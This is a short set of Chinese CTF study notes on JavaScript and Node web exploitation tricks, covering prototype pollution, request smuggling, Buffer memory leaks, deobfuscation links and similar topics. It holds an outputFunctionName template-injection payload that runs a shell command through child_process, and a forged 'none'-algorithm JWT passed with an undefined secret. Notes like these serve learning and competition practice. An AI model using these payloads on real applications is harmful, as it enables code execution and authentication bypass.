- # 原型链污染
	- [[CTF/JS/原型链污染]]
- # 在HTTP请求中伪造整个HTTP请求
	- ((63c7fc34-474b-48bd-a4f8-5c5a68188c89))
- # outputFunctionName
	- `a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');//`
- # 大小写转换
	- https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html
- # 乱码加密
  id:: 636665b6-16ed-4f0a-b6fc-46c5756e5222
	- 题目：NaNNaNNaNNaN-Batman
	  
	  js 中的控制字符代表 js 代码，可以被 js 自动转义
- # Buffer()
	- 在较早一点的 node 版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。
- # JWT
  id:: 62efd884-36bd-4729-a628-6c94b3f1b08b
	- 不知道 secret，可以通过传入一个 undefined 来关闭验证功能。
		- ```javascript
		  const evil_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY0NzMzNDY5OH0."
		  const result = jwt.verify(
		  evil_jwt,   // 不包含签名的自定义jwt
		  undefined,  // secret
		  "HS256"     //受害者指定的加密算法
		  );
		  ```
- # 绕过
	- [[CTF/JS/WAF绕过]]
- # 注释
	- JS 也可以使用 html 的注释`<!-- -->`
- # 解混淆
	- https://blog.csdn.net/weixin_43411585/article/details/123437953
	- https://blog.csdn.net/freeking101/article/details/121668637
-